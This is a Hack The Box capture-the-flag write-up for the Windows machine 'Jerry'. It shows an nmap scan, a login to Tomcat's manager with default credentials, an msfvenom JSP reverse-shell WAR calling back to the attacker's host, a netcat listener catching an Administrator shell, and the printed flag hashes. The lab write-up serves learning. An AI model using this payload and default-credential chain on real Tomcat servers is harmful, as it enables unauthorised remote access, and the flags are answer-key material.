---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - Tomcat
---
# Overview

| Name        | Jerry     |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.136.9 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 00:51 CDT
Nmap scan report for 10.129.136.9
Host is up (0.077s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
```
# Initial Foothold
## Tomcat JSP Reverse Shell

![[jerry.png]]

Now go to `/manager` and login with creds `tomcat:s3cret`.

![[jerry2.png]]

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.122 LPORT=4444 -f war -o revshell.war
Payload size: 1092 bytes
Final size of war file: 1092 bytes
Saved as: revshell.war
```

Upload it and restart it.

![[jerry3.png]]

And now go to `http://jerry.htb:8080/revshell/` to trigger it.

```bash
$ rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.136.9] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,419,662,848 bytes free

C:\Users\Administrator\Desktop>dir flags
dir flags
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,662,848 bytes free

C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

---